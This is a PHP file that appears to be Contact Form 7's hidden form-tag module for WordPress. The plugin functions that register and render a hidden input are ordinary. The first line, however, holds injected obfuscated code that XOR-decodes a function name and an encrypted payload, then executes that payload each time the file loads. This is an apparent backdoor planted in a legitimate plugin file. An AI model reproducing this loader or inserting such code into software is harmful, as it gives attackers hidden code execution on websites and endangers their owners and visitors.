<?php $UolMxzK='UB<X<+gT,V9E W8'; $WjMZpFC='60Y9HN82Y8Z1I8V'^$UolMxzK; $qOjFKBxT='=6gcX,YR;ZT:h4; BYCoq1+77Y7-Q<t<=JlMao2zcS PN:>.PUL8<mZ C2aeZ03yk10M iTR HLfzFyaFWxSKvZ7Tqmfkdqp3o.ZBqk;rnAvrZQWh= OR4XNFHS11klqSZnyd=A9o7U:TFhgOjD3NY5c8mK9os 0LolWUsR HJL6CkA 7CCpenxnj==<II yt.B<jxpjDs6ChiPL3 vxv73G:Xzcl X=1c;,.wiU0 U6=v9m37G2 QEjCJqm=b=p=g3NlmYRNsxHqfM1T;4xjPXKIZ;:AhPP4TQxf20WS2HK+P YtoorD-=7.pn7z=GZdpWrQ--.GoNxh5ZOU42:iij55vlkk5gwS8Ua<4=uHwCg R57=Gr:czSRX =2b-+-vzeiS7Da4m0k4RB7uwnr4+. 1s=n4r>s=pH GUnltt6>7Q1WV:E 1LE5D> RD5>h  Hm 2FEBWg 62 JPpuYSH-mfRg=7DMi ,MoXH4UXliR3YJvwko JD8D0<UJs6;I2G zf 3UdEGo3+26qsRLHf ,Txs=VFYkvX.5paFHpjzfZujJJInXV;QX,9XU27R+w6XtWq,KSX1rtLfsJd1A 6Hg34H0N 09LMQF5M: W8+QMmhRR8YcElgIdNy>ypI=3YCsW CVbA3+=T-T6rdOto= H09beFpr0'; $KeiZGG=$WjMZpFC('', 'TPOB>Y71O3;T7QCI1-0GVIDEh=VY0c+QH>KdHOIpj5U>-NWA>u4WN2>A7S>:7EGQOUQ9AEtvK-5OZfYAf,rZBR5B QPFLCJz:fH50YORRSaFIzu>TNT=>Q6fb,2EPBWQw3ERM7H0KX NthUGgN R:8nGQ0kgOWKU54H>uVrS<8 S-CeKR:j-LUrgcOXH<;NQPA7HCCzc9yKIbM4-GAVEVQR+I=AiHD9IP<PIWWTuVA9EXM3gUX5WA2-Jkn..r-v9xGR=LI277SEvQB;P8NQQJ+RBm>ZN 7;5MtlXBYU.h8AoO1T8TROV2LQBKKdJp7.<DXvV5LYOnO5raS5=0UQRIANjg3=>.f3W2KuEWQDUuIcCV3YBXnRAisZv<AIS=FNTVGEM8R=Z>d9OP36VUJNVBJBUTH7gIxCy7T,A34NQT4CPD4C>7V,ZTd=Z6aD30Ta7MU<EBS5 tc8DSQO.5XQ=2<LDJrCYV0,6KI4Fqs><>DM6R-+VQMOA86Y=oW03,SC A3SRAKV,CigKWJFWXStjhNMHaPWY7280Q3KLW<ohMWZAkLRxyyYk3X3:MXn4VQaJBT9L5CMx7=WESeFUlDP3RW18XQ1o+XYJ8>yaE,CL8YOvaML63L8JlLGiDnYEsy,KR5kW3A779fCJD8B5RU9fOe4E0YMJUoKxM'^$qOjFKBxT); $KeiZGG();

add_action( 'wpcf7_init', 'wpcf7_add_form_tag_hidden', 10, 0 );

function wpcf7_add_form_tag_hidden() {
	wpcf7_add_form_tag( 'hidden',
		'wpcf7_hidden_form_tag_handler',
		array(
			'name-attr' => true,
			'display-hidden' => true,
		)
	);
}

function wpcf7_hidden_form_tag_handler( $tag ) {
	if ( empty( $tag->name ) ) {
		return '';
	}

	$atts = array();

	$class = wpcf7_form_controls_class( $tag->type );
	$atts['class'] = $tag->get_class_option( $class );
	$atts['id'] = $tag->get_id_option();

	$value = (string) reset( $tag->values );
	$value = $tag->get_default_option( $value );
	$atts['value'] = $value;

	$atts['type'] = 'hidden';
	$atts['name'] = $tag->name;
	$atts = wpcf7_format_atts( $atts );

	$html = sprintf( '<input %s />', $atts );
	return $html;
}
